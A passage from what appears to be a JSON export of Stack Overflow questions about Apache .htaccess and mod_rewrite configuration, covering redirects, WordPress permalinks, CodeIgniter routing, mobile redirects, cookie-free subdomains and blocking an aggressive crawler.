sent:</p>\n\n<blockquote>\n  <p>Request\n  URL:localhost/SAMPLE-CODES/backbone.js-mysql-reading-json/websites/\n  Request Method:GET Status Code:404 Not Found</p>\n</blockquote>\n\n<p>My question is: why is this request not triggering the call to the 'addWebsite' function ?\nI see that the second http request is a GET, when it should be a POST, but even then there is a route for that...</p>\n\n<p>I have a folder /websites/</p>\n\n<p>I also set the the .htaccess and http.conf as per the <a href=\"http://www.slimframework.com/documentation/stable#routing-indepth\" rel=\"nofollow\">Slim routing documentation</a>:</p>\n\n<p>.htaccess</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteRule ^ index.php [QSA,L]\n</code></pre>\n\n<p>http.conf</p>\n\n<pre><code>&lt;VirtualHost *:80&gt;\n    &lt;Directory \"c:/xampp/htdocs/SAMPLE-CODES/backbone.js-mysql-reading-json/websites/\"&gt;\n        AllowOverride All\n        Order allow,deny\n        Allow from all\n    &lt;/Directory&gt;\n&lt;/VirtualHost&gt;\n</code></pre>\n\n<hr>\n\n<p><strong>Edit</strong>:</p>\n\n<p>The call to model.save() triggers an http POST to </p>\n\n<blockquote>\n  <p>localhost/SAMPLE-CODES/backbone-mysql-reading-json/websites</p>\n</blockquote>\n\n<p>.</p>\n\n<p>This gets a '301 Moved Permanently' with response header says: </p>\n\n<blockquote>\n  <p>localhost/SAMPLE-CODES/backbone-mysql-reading-json/websites/</p>\n</blockquote>\n\n<p>.</p>\n\n<p>I assume this is due to the Slim recommended .htaccess settings.</p>\n\n<p><strong>Question</strong>: Is this OK to have this '301 Moved Permanently', or do I already have an issue here?</p>\n\n<p>Then I see 2nd http GET to </p>\n\n<blockquote>\n  <p>localhost/SAMPLE-CODES/backbone-mysql-reading-json/websites/</p>\n</blockquote>\n\n<hr>\n\n<p><strong>Update</strong>:</p>\n\n<p>I am still getting a 301 on </p>\n\n<blockquote>\n  <p>localhost/SAMPLE-CODES/backbone-mysql-reading-json/websites</p>\n</blockquote>\n\n<p>, then a GET to </p>\n\n<blockquote>\n  <p>localhost/SAMPLE-CODES/backbone-mysql-reading-json/websites/</p>\n</blockquote>\n\n<p>This second request works on a browser and returns </p>\n\n<blockquote>\n  <p>[{\"id\":\"1\",\"title\":\"titre site 1\"},{\"id\":\"2\",\"title\":\"titre site 2\"}]</p>\n</blockquote>\n\n<p>So that would be the response for all records, but I wanted to save 1 record.\nIt seems the redirect 301 is wrong.</p>\n\n<p>I have a feeling it is due to Slim not finding a matching route (<a href=\"http://dev.slimframework.com/phpdocs/classes/Slim_Exception_RequestSlash.html\" rel=\"nofollow\">Slim_Exception_RequestSlash would trigger a 301</a>).</p>\n\n<p>But why my Slim script not find the route?</p>\n\n<p>The request for </p>\n\n<blockquote>\n  <p>localhost/SAMPLE-CODES/backbone-mysql-reading-json/websites</p>\n</blockquote>\n\n<p>is matched by:</p>\n\n<blockquote>\n  <p>$app->post('/websites', function() {</p>\n</blockquote>\n"},{"tags":["wordpress",".htaccess","xampp","permalinks"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":109,"score":0,"question_id":12311737,"title":"permalinks is not working in xampp/localhost server on windows 7","body":"<p>When I click over permalinks from the wordpress admin it creates .htaccess file in the root folder automatically and then wordpress site stops working with the browser error <strong>server error 500</strong> I have made following settings in httpd.conf and my mod_rewrite is working as per php.ini displays.</p>\n\n<p><strong>httpd.conf SETTINGS</strong></p>\n\n<pre><code>&lt;Directory \"E:/xampp/cgi-bin\"&gt;\n    Options FollowSymLinks\n    AllowOverride All\n    Order allow,deny\n    Allow from all\n&lt;/Directory&gt;\n</code></pre>\n\n<hr>\n\n<pre><code>&lt;Directory \"E:/xampp/htdocs\"&gt;\n    #\n    # Possible values for the Options directive are \"None\", \"All\",\n    # or any combination of:\n    #   Indexes Includes FollowSymLinks SymLinksifOwnerMatch ExecCGI MultiViews\n    #\n    # Note that \"MultiViews\" must be named *explicitly* --- \"Options All\"\n    # doesn't give it to you.\n    #\n    # The Options directive is both complicated and important.  Please see\n    # http://httpd.apache.org/docs/2.2/mod/core.html#options\n    # for more information.\n    #\n    Options All\n\n    #\n    # AllowOverride controls what directives may be placed in .htaccess files.\n    # It can be \"All\", \"None\", or any combination of the keywords:\n    #   Options FileInfo AuthConfig Limit\n    #\n    AllowOverride All\n\n    #\n    # Controls who can get stuff from this server.\n    #\n    Order allow,deny\n    Allow from all\n\n&lt;/Directory&gt;\n</code></pre>\n\n<hr>\n\n<p><strong>HTACCESS FILE CODE</strong></p>\n\n<pre><code># BEGIN WordPress\n&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteBase /xampp/ozi-tech/\nRewriteRule ^index\\.php$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . /xampp/ozi-tech/index.php [L]\n&lt;/IfModule&gt;\n# END WordPress\n</code></pre>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":20,"score":0,"question_id":12232097,"title":"writing mod-rewrite rules","body":"<p>I'm trying to write a htaccess file for the following URL to be parsed.</p>\n\n<pre><code>/folder/title-of-article/id=6\n</code></pre>\n\n<p>to be passed to-</p>\n\n<pre><code>/page.php?id=6\n</code></pre>\n\n<p>How do I do this?</p>\n"},{"tags":["apache",".htaccess","mod-rewrite","redirect"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":22,"score":0,"question_id":12311360,"title":"redirect directory to new address","body":"<p>hi i want redirect my directory to new address and remove .html ext from end</p>\n\n<p>example:</p>\n\n<pre><code>http://www.mysite.com/viewdownload/11-e/652-elena-2010.html\nredirect to\nhttp://www.mysite.com/download/viewdownload/11-e/652-elena-2010\n</code></pre>\n\n<p>or</p>\n\n<pre><code>http://www.mysite.com/viewdownload/9-b/1281-birdsong-2012.html\nredirect to\nhttp://www.mysite.com/download/viewdownload/9-b/1281-birdsong-2012\n</code></pre>\n"},{"tags":["php",".htaccess","spam-prevention","user-agent","proxy-server"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":282,"score":0,"question_id":7031753,"title":"Blocking automated spam bots via htaccess or PHP?","body":"<p>What there be a performance hit when I add this to my <strong>.htaccess</strong> file:</p>\n\n<p><a href=\"http://en.linuxreviews.org/HOWTO_stop_automated_spam-bots_using_.htaccess\" rel=\"nofollow\">HOWTO stop automated spam-bots using .htaccess</a></p>\n\n<p>or should I add it to my <strong>PHP</strong> file instead?</p>\n\n<p>or leave it out completely? Because spammers might <strong>fake their useragent</strong> anyway?</p>\n\n<p>Would it also make sense to prevent users from accessing your website via a <strong>proxy server</strong>? I know that this might also block people from accessing your website who didn't come here with bad intentions. But, what are some of the reasons why people would visit a website via a proxy server, other than spam, or when a website is blocked in their country?</p>\n"},{"tags":[".htaccess","codeigniter","routes","rewrite","codeigniter-2"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":76,"score":0,"question_id":12291157,"title":"Codeigniter htaccess and routing for a SEO controller name in urls","body":"<p>I'm having a controller named : main_controller\nall the links in my app refers to it with url like : <code>/main_controller/...</code></p>\n\n<p>Now i want to insert some <strong>SEO</strong> in all this and change the url to a more seo one like <code>/seo_name_for_controller/...</code></p>\n\n<p>Instead of doing a full manual search &amp; replace for all occurences which may be source of errors, I wish i could do this using <strong>htaccess</strong> with something like :</p>\n\n<pre><code>RewriteRule ^/main_controller/(.*)$ /seo_name_for_controller/$1 [L,R=301]\n</code></pre>\n\n<p>Then using <strong>routes.php</strong> to finish the process like :</p>\n\n<pre><code>$route['seo_name_for_controller/(:any)'] = \"main_controller/$1\";\n</code></pre>\n\n<p>Is it possible or will it cause an infinite loop ? does someone have a code example for this ?</p>\n"},{"tags":[".htaccess","search-engine","web-crawler","bots","robots.txt"],"answer_count":3,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":694,"score":3,"question_id":12304954,"title":"how to ban crawler 360Spider with robots.txt or .htaccess?","body":"<p>I've got a problems because of 360Spider: this bot makes too many requests per second to my VPS and slows it down (the CPU-usage becomes 10-70%, but usually i have 1-2%). I looked into httpd logs and saw there such lines:</p>\n\n<pre><code>182.118.25.209 - - [06/Sep/2012:19:39:08 +0300] \"GET /slovar/znachenie-slova/42957-polovity.html HTTP/1.1\" 200 96809 \"http://www.hrinchenko.com/slovar/znachenie-slova/42957-polovity.html\" \"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.8.0.11) Gecko/20070312 Firefox/1.5.0.11; 360Spider\n182.118.25.208 - - [06/Sep/2012:19:39:08 +0300] \"GET /slovar/znachenie-slova/52614-rospryskaty.html HTTP/1.1\" 200 100239 \"http://www.hrinchenko.com/slovar/znachenie-slova/52614-rospryskaty.html\" \"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.8.0.11) Gecko/20070312 Firefox/1.5.0.11; 360Spider\n</code></pre>\n\n<p>etc.</p>\n\n<p>How can I block this spider completely via robots.txt? Now my robots.txt looks like this:</p>\n\n<pre><code>User-agent: *\nDisallow: /cgi-bin/\nDisallow: /tmp/\n\nUser-agent: YoudaoBot\nDisallow: /\n\nUser-agent: sogou spider\nDisallow: /\n</code></pre>\n\n<p>I've added lines:</p>\n\n<pre><code>User-agent: 360Spider\nDisallow: /\n</code></pre>\n\n<p>but that does not seem to work. How to block this angry bot?</p>\n\n<p>If you offer to block it via .htaccess, so mind that it looks now like this:</p>\n\n<pre><code># Turn on URL rewriting\nRewriteEngine On\n\n# Installation directory\nRewriteBase /\n\nSetEnvIfNoCase Referer ^360Spider$ block_them\nDeny from env=block_them\n\n# Protect hidden files from being viewed\n&lt;Files .*&gt;\n    Order Deny,Allow\n    Deny From All\n&lt;/Files&gt;\n\n# Protect application and system files from being viewed\nRewriteRule ^(?:application|modules|system)\\b.* index.php/$0 [L]\n\n# Allow any files or directories that exist to be displayed directly\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\n\n# Rewrite all other URLs to index.php/URL\nRewriteRule .* index.php/$0 [PT]\n</code></pre>\n\n<p>And, in spite of presence of </p>\n\n<pre><code>SetEnvIfNoCase Referer ^360Spider$ block_them\nDeny from env=block_them\n</code></pre>\n\n<p>this bot still tries to kill my VPS and is logged in access logs.</p>\n"},{"tags":["php","apache",".htaccess","codeigniter","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":12306637,"title":"Using mod_rewrite to pass requests to CodeIgniter in a subfolder","body":"<p>I'm trying to pass requests from the root of my url to a subfolder without redirecting using mod_rewrite. (Note: I'm doing this on Rackspace Cloud Sites.)</p>\n\n<p>I took the CI .htaccess, moved it up to the root folder, and changed it from this:</p>\n\n<pre><code>RewriteEngine on\nRewriteCond $1 !^(index\\.php|images|public|robots\\.txt)\nRewriteRule ^(.*)$ /ci/index.php/$1 [L]\n</code></pre>\n\n<p>to this:</p>\n\n<pre><code>RewriteEngine on\nRewriteCond $1 !^(index\\.php|images|public|robots\\.txt)\nRewriteBase /ci/\nRewriteRule ^(.*)$ /ci/index.php/$1 [L]\n</code></pre>\n\n<p>Which gives me an internal server error. I don't believe this sort of this has an error log, which is probably why I've always considered mod_rewrite to be alchemy.</p>\n\n<p>Maybe you can see what's going wrong?</p>\n\n<p>Thanks! </p>\n"},{"tags":["apache",".htaccess","cpanel"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":70,"score":0,"question_id":12295109,"title":"Redirect a subdomain to another but don't change the address bar","body":"<p>I want to redirect <code>subdomain1.domain.com</code> to <code>subdomain2.domain.com</code> but without changing the addres in the address bar.</p>\n\n<p>Is this possible via .htaccess? If not, what will be an alternative solution (I'm using cPanel)?</p>\n\n<p>I don't want to use a proxy ([P])!!!</p>\n"},{"tags":[".htaccess","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":57,"score":0,"question_id":12302516,"title":"Why do I get a 301 redirect to folder name with slash?","body":"<p>A request to <code>http://localhost/SAMPLE-CODES/backbone-mysql-reading-json/websites</code></p>\n\n<p>gets redirected as follows:</p>\n\n<pre><code>&gt; Request URL:http://localhost/SAMPLE-CODES/backbone-mysql-reading-json/websites\n&gt; Request Method:GET\n&gt; Status Code:301 Moved Permanently\n</code></pre>\n\n<p><strong>Response headers:</strong></p>\n\n<pre><code>&gt; HTTP/1.1 301 Moved Permanently Date: Thu, 06 Sep 2012 14:32:41 GMT\n&gt; Server: Apache/2.2.17 (Win32) mod_ssl/2.2.17 OpenSSL/0.9.8o PHP/5.3.4\n&gt; mod_perl/2.0.4 Perl/v5.10.1 Location:\n&gt; http://localhost/SAMPLE-CODES/backbone-mysql-reading-json/websites/\n&gt; Content-Length: 417 Keep-Alive: timeout=5, max=100 Connection:\n&gt; Keep-Alive Content-Type: text/html; charset=iso-8859-1\n</code></pre>\n\n<p>I am not sure what causes this redirect.</p>\n\n<p>I have the following .htaccess in folder <code>c:\\xampp\\htdocs\\SAMPLE-CODES\\backbone-mysql-reading-json\\</code>:</p>\n\n<p><strong>.htaccess</strong></p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteRule ^ index.php [QSA,L]\n</code></pre>\n"},{"tags":["php",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":12299616,"title":"how to keep 1 url from rewrited after use .htaccess","body":"<p>My htaccess file contains</p>\n\n<pre><code>RewriteEngine on\nRewriteCond %{THE_REQUEST} ^[A-Z]+\\s([^\\s]+)\\.php\\s\nRewriteRule .* %1.html [R=301,L]\nRewriteRule ^(.*)\\.html$ $1.php\nRewriteCond %{ENV:REDIRECT_STATUS} 200\nRewriteRule ^.*$ - [L]\nRewriteRule ^index.php$ http://%{http_host}/ver1 [R=301,L]\n</code></pre>\n\n<p>and it works fine</p>\n\n<p>But my form action needs to point at a .php file</p>\n\n<p>How do I prevent form.php from being rewritten?</p>\n\n<p>I don't want the file form.php to be rewritten to form.html</p>\n"},{"tags":["html",".htaccess"],"answer_count":6,"favorite_count":26,"up_vote_count":13,"down_vote_count":0,"view_count":22444,"score":13,"question_id":3680463,"title":"Mobile Redirect using htaccess","body":"<p>I have a website called</p>\n\n<p><code>www.website.org</code></p>\n\n<p>I have a mobile website called</p>\n\n<p><code>m.website.org</code></p>\n\n<p>I want to use an htaccess to automatically redirect the main website URL to the mobile version..</p>\n\n<p>However, there is a link on the mobile version that points back to the main website called</p>\n\n<p><code>www.website.org?noredirect=true</code></p>\n\n<p>When I click the logo on the home page of the actual website it links to</p>\n\n<p><code>www.website.org</code></p>\n\n<p>I don't want the user to be allowed back to mobile accidentally by clicking on the logo on the main page. How can I accomplish this via htaccess without JavaSCript.</p>\n\n<p>If not I am open-minded to alternate options.</p>\n\n<p><strong>EDIT</strong></p>\n\n<p>I think I am currently going to use this for sensing mobile redirect via htaccess</p>\n\n<pre><code>RewriteEngine On\nRewriteBase /\n\nRewriteCond %{HTTP_USER_AGENT} android|avantgo|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge\\ |maemo|midp|mmp|opera\\ m(ob|in)i|palm(\\ os)?|phone|p(ixi|re)\\/|plucker|pocket|psp|symbian|treo|up\\.(browser|link)|vodafone|wap|windows\\ (ce|phone)|xda|xiino [NC,OR]\nRewriteCond %{HTTP_USER_AGENT} ^(1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a\\ wa|abac|ac(er|oo|s\\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\\-m|r\\ |s\\ )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\\-(n|u)|c55\\/|capi|ccwa|cdm\\-|cell|chtm|cldc|cmd\\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\\-s|devi|dica|dmob|do(c|p)o|ds(12|\\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\\-|_)|g1\\ u|g560|gene|gf\\-5|g\\-mo|go(\\.w|od)|gr(ad|un)|haie|hcit|hd\\-(m|p|t)|hei\\-|hi(pt|ta)|hp(\\ i|ip)|hs\\-c|ht(c(\\-|\\ |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\\-(20|go|ma)|i230|iac(\\ |\\-|\\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt(\\ |\\/)|klon|kpt\\ |kwc\\-|kyo(c|k)|le(no|xi)|lg(\\ g|\\/(k|l|u)|50|54|e\\-|e\\/|\\-[a-w])|libw|lynx|m1\\-w|m3ga|m50\\/|ma(te|ui|xo)|mc(01|21|ca)|m\\-cr|me(di|rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\\-|\\ |o|v)|zz)|mt(50|p1|v\\ )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\\-2|po(ck|rt|se)|prox|psio|pt\\-g|qa\\-a|qc(07|12|21|32|60|\\-[2-7]|i\\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\\-|oo|p\\-)|sdk\\/|se(c(\\-|0|1)|47|mc|nd|ri)|sgh\\-|shar|sie(\\-|m)|sk\\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\\-|v\\-|v\\ )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\\-|tdg\\-|tel(i|m)|tim\\-|t\\-mo|to(pl|sh)|ts(70|m\\-|m3|m5)|tx\\-9|up(\\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\\-|\\ )|webc|whit|wi(g\\ |nc|nw)|wmlb|wonu|x700|xda(\\-|2|g)|yas\\-|your|zeto|zte\\-) [NC]\nRewriteRule ^$ http://m.website.com [R,L]\n</code></pre>\n"},{"tags":["wordpress",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":12299872,"title":"Add a question mark before postname in permalink structure(WP","body":"<p>I have a wordpress post url like</p>\n\n<p><a href=\"http://www.mywpblog.com/firstpost\" rel=\"nofollow\">http://www.mywpblog.com/firstpost</a></p>\n\n<p>Now I would like to change it to </p>\n\n<p><a href=\"http://www.mywpblog.com/?firstpost\" rel=\"nofollow\">http://www.mywpblog.com/?firstpost</a></p>\n\n<p>Is it possible via htaccess or any wp tricks.</p>\n\n<p>Thanks in advance..</p>\n\n<p>Regards,\nRaj</p>\n"},{"tags":[".htaccess","redirect","rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":26,"score":1,"question_id":12298736,"title":".htaccess rewrite rule for unknown variables","body":"<p>I have a URL in the following format:</p>\n\n<pre><code>http://example.com/auction/lot/0001/\n</code></pre>\n\n<p>Where <strong>1</strong> is the SKU of the product in question.</p>\n\n<p>I would like to setup a rewrite rule where anyone visiting <strong>/auction/lot/1/</strong> is redirected to the <strong>0001</strong> version.</p>\n\n<p>What I can't get my head around is working out the number of <strong>0's</strong>. </p>\n\n<p>For example an SKU of <strong>150</strong> would mean someone visiting <strong>/auction/lot/150</strong> would need to be directed to <strong>/auction/lots/0150</strong> where as an SKU of <strong>3016</strong> would remain the same for both.</p>\n\n<p>Does anyone know how to do this? Any help would be greatly appreciated!</p>\n"},{"tags":["apache",".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":12,"score":0,"question_id":12299836,"title":"Accept request to a specific sub directory but redirect request to root to another URL","body":"<p>i need to setup a (basic) redirect rule but i'm totally not into redirect rules at all, so i could use a hand:</p>\n\n<p>Accept requests to a specific sub directory like www.foo.com/bar (internal redirect to webroot) but send all other request (incl. www.foo.com/) to another url (server).</p>\n\n<p>Thanks: Lars</p>\n"},{"tags":["apache",".htaccess","htpasswd"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":29,"score":1,"question_id":12299556,"title":"Restrict HTML files access","body":"<p>I have a portal with Login Authentication and after the user login to the website we are providing few links to the HTML files. This works perfect.</p>\n\n<p>My concern is User's are able to access the HTML files without logging to the portal. I will not be able to convert the file to PHP as these files are huge and will be modified and updated regularly.</p>\n\n<p>Please suggest how i can restrict the direct access to the HTML if the user is not logged in.</p>\n\n<p>Tx\nSuneel</p>\n"},{"tags":[".htaccess","web-crawler","spider"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":12299488,"title":"Stop spiders reading single page with htaccess?","body":"<p>I have a file which is called with jquery/ajax and then sits in a div and I have 2 problems with it:</p>\n\n<p><strong>1,</strong> If you browse to this file directly you can view it.</p>\n\n<p>I've been looking for a way to stop <em>direct access</em> to this file but it seems it can't be stopped because its jquery/ajax (at least every answer I have read about it they say no) so the only solution is to not mention it and hide any reference of it which is where problem 2 kicks in ...</p>\n\n<p><strong>2,</strong> At present in searchengine results this file shows up</p>\n\n<p>I know I can stop user-agents with robots.txt</p>\n\n<pre><code>User-agent: *\ndisallow: /myfile.php\n</code></pre>\n\n<p>but that can be easily found and read so was wondering if there is a htaccess equivalent?</p>\n"},{"tags":[".htaccess","mod-rewrite","cdn","cname"],"answer_count":3,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":104,"score":0,"question_id":12293605,"title":"mod_rewrite on subdomain","body":"<p><strong>It took 12 hours and dozen of posts on stackoverflow turned purple but still don't know what did I do wrong</strong></p>\n\n<p>I'm tried to <strong>setup cookie-free domain using mod_rewrite</strong> on .htaccess rewriting subdomain (a1,a2,a3,a4,a5) to root.</p>\n\n<p>here is what I got so far..</p>\n\n<pre><code>RewriteCond %{HTTP_HOST} ^a1.my-domain.com [NC]\nRewriteRule ^(.*)$ http://www.my-domain.com/$1 [R=301,NC]\n</code></pre>\n\n<p>then, I uploaded to the root directory and opened a php file from the browser with this code</p>\n\n<pre><code>&lt;img src=\"http://a1.my-domain.com/images/imgname.jpg\"&gt;\n</code></pre>\n\n<p>also tried go directly to the URL</p>\n\n<pre><code>http://a1.my-domain.com/images/imgname.jpg\nhttp://a1.my-domain.com/\n</code></pre>\n\n<p>but both are not working, the image didn't show up, <em>while other codes in .htaccess works just fine</em>. Could you please suggest a solution on this?</p>\n\n<p>////////////// <strong>EDIT MORE INFO</strong> //////////////</p>\n\n<p>According to - <a href=\"http://www.stoimen.com/blog/2010/03/12/use-cookie-free-domain-and-cdn-for-static-content/\" rel=\"nofollow\">http://www.stoimen.com/blog/2010/03/12/use-cookie-free-domain-and-cdn-for-static-content/</a> - I want to setup a Cookie Free Domain without moving resources to the subdomain and to create a pararel load which, from what I understand, increase connection when the website load and in the same time make it cookie free.</p>\n\n<p>I want to load the html below</p>\n\n<pre><code>&lt;img src=\"http://www.my-domain.com/images/imageA.jpg\"&gt;\n&lt;img src=\"http://www.my-domain.com/images/imageB.jpg\"&gt;\n&lt;img src=\"http://www.my-domain.com/images/imageC.jpg\"&gt;\n</code></pre>\n\n<p>using these below (pointing 'a*.my-domain.com' to 'www.my-domain.com')</p>\n\n<pre><code>&lt;img src=\"http://a1.my-domain.com/images/imageA.jpg\"&gt;\n&lt;img src=\"http://a2.my-domain.com/images/imageB.jpg\"&gt;\n&lt;img src=\"http://a3.my-domain.com/images/imageC.jpg\"&gt;\n</code></pre>\n\n<p>By reading  about Cookie-Free, I just need to create a subdomain and point it to the root www but, as my host provides DirectAdmin control panel, I can't point subdomain anywhere but the subfolder with its name and I don't have access to Apache for modifying a Virtual Host configuration. So, I tried to use .htaccess to do it. Can you suggest how to do it? and I'm quite new to this so, please correct me if I misunderstood. Thank you :)</p>\n"},{"tags":[".htaccess","redirect","opencart"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":165,"score":1,"question_id":12297545,"title":"301 permenanat redirect in opencart","body":"<p>I have to use 301 permenant redirect in my opencart site. Am using the following codes in my .htaccess. Both are working in the case of http:// but not in https://</p>\n\n<pre><code>Options +FollowSymLinks\nRewriteEngine On\nRewriteCond %{HTTP_HOST} ^domain\\.com$ [NC]\nRewriteRule ^(.*)$ http://www.domain.com/$1 [R=301,L]\n</code></pre>\n\n<p>and </p>\n\n<pre><code>RewriteEngine on \nRewriteCond %{HTTP_HOST} ^meinedomain.de \nRewriteRule ^(.*)$ http://www.meinedomain.de/$1 [r=301,L] \n\nRewriteCond %{HTTPS_HOST} ^meinedomain.de \nRewriteRule ^(.*)$ https://ssl.meinedomain.de/$1 [r=301,L]\n</code></pre>\n\n<p>But some of my pages are loding in https:// like sign in, checkout etc. When i use the above code then am not able to sign in to the site. What changes are needed for the proper working of https...??</p>\n\n<p>When I search my site in google then www. does not appear in the result. It shows mysite.com. What can I do for this??\nAnybody please help.\nThanks.</p>\n"},{"tags":["php",".htaccess","codeigniter","redmine"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":141,"score":0,"question_id":10254224,"title":"custom URL mappings in codeigniter like redmine?","body":"<p>So redmine has a very peculiar url mapping style that i observed :</p>\n\n<pre><code>http://demo.redmine.org/projects/&lt;project-name&gt;/controller/action\n</code></pre>\n\n<p>samples : </p>\n\n<pre><code>http://demo.redmine.org/projects/produto/activity\nhttp://demo.redmine.org/projects/produto/issues/new\nhttp://demo.redmine.org/projects/produto/issues/gantt\nhttp://demo.redmine.org/projects/produto/files\n</code></pre>\n\n<p>and the url changes as the project changes.</p>\n\n<p>how do i do this in codeigniter ? I'm thinking it can be done with routes.php but so far i'm not able to get anywhere.</p>\n\n<p>Looking for any help. Thanks.</p>\n"},{"tags":["apache",".htaccess","mod-rewrite","url-rewriting"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":37,"score":2,"question_id":12296846,"title":".htaccess regex url redirection","body":"<p>I'm looking for a regular expression for a .htaccess file where I can redirect one URL to another.</p>\n\n<p>URL1:\n/dir/an-article-title-<strong>222</strong></p>\n\n<p>URL2:\n/dir/<strong>222</strong>/an-article-title</p>\n\n<p>I would like URL1 to 301 redirect to URL2.</p>\n\n<p>In highlevel language, I think I want to tell .htaccess to:</p>\n\n<ol>\n<li>Take the digits after the last dash (-)</li>\n<li>Put those digits before the article name with a trailing slash, i.e. 222/</li>\n<li>Remove the last dash and digits from the article name</li>\n</ol>\n\n<p>Any thoughts, suggestions, code are welcome!</p>\n"},{"tags":[".htaccess","dns","cookieless"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":424,"score":1,"question_id":4441338,"title":"Cookieless Domain Help","body":"<p>I've been reading a bit about serving my images, javascript and css from a seperate domain.</p>\n\n<p>I have set up a domain, not a sub domain but a new account on my server.</p>\n\n<p>My site is for example: <code>http://www.site.com</code></p>\n\n<p>I have set up a new account for <code>http://s1.site.com</code></p>\n\n<p>To cut it short, I have about 40gb of images, so rather me moving it (would also require me to update a few of my scripts as I have scrapers to grab images) I was wondering if there was a way to point my new sub-domain to my other content?</p>\n\n<p>Basically, I want to create a .htaccess file on s1.site.com and get it to pull the info from www.site.com, for example:</p>\n\n<pre><code>http://www.site.com/images/picture.jpg\n</code></pre>\n\n<p>becomes</p>\n\n<pre><code>http://s1.site.com/images/picture.jpg\n</code></pre>\n\n<p>But the image doesn't really exist on the <code>s1.site.com</code>, we are just 'mirroring' it using htaccess to save the hassle of copying everything over to the static domain.</p>\n\n<p>Please let me know how this is possible, as it would save me a great deal of time and would work wonders.</p>\n\n<p>I basically just want to make anything on </p>\n\n<p><code>http://s1.site.com/*</code> pull from <code>/home/originalsite/public_html/(images/js/css folders)</code></p>\n"},{"tags":["apache",".htaccess","drupal","drupal-7"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":84,"score":1,"question_id":12295110,"title":"how to redirect with htaccess to a subdirectory but dont show the folder in url (drupal 7)","body":"<p>(There are very similar questions but none of that solved it)</p>\n\n<ol>\n<li>My domain is www.abc.com this is automaticly mapped to /public_html (made by my hoster, i can't change in admin panel)</li>\n<li>My cms drupal7.15 is in folder public_html/foo/drupal715/</li>\n</ol>\n\n<p>Big question:\n<strong>WHY: When i open www.abc.com, the url looks www.abc.com/foo/drupal715/index.php</strong>\nIt should be the same! BUT the other links or pages i created with drupal are working e.g www.abc.com/myproject</p>\n\n<p>Look at my configuration</p>\n\n<p>I have the first .htaccess in root (public_html) which looks like:</p>\n\n<pre><code>RewriteEngine on\nRewriteCond %{HTTP_HOST} ^www.abc.com$ [OR]\nRewriteCond %{HTTP_HOST} ^abc.ch$ [OR]\nRewriteRule ^(.*)$ /foo/drupal715/$1 [PT,L,QSA]\n</code></pre>\n\n<p>This redirects to my sub dir works but why the url shows the folder when i open my main url ?</p>\n\n<p>Any help, please! im so tired of trying.</p>\n\n<p>Here the intresting part of the htaccess in drupal root.</p>\n\n<pre><code> # Modify the RewriteBase if you are using Drupal in a subdirectory or in a\n  # 